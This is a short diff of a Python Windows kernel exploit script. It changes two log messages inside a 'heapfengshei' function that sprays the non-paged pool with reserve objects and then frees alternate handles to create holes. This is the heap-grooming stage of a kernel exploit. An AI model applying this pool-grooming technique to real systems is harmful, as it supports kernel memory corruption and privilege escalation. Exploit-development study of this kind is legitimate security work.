@@ -175,12 +175,12 @@ def heapfengshei():
         handleresult = NtAllocateReserveObject(byref(HANDLE()), 0x0, 0x1)
         IoCo_array1.append(handleresult)
 
-    print "\t[+]Allocating second round of Ioco's"
+    print "\t[+]Spraying consecutive objects"
     for b in range(5000):
         handleresult = NtAllocateReserveObject(byref(HANDLE()), 0x0, 0x1)
         IoCo_array2.append(handleresult)
 
-    print "\t[+]Making holes in non-paged pool"
+    print "\t[+]Making holes in consecutive objects"
     for c in range(0, 5000, 2):
         CloseHandle(IoCo_array2[c])
 
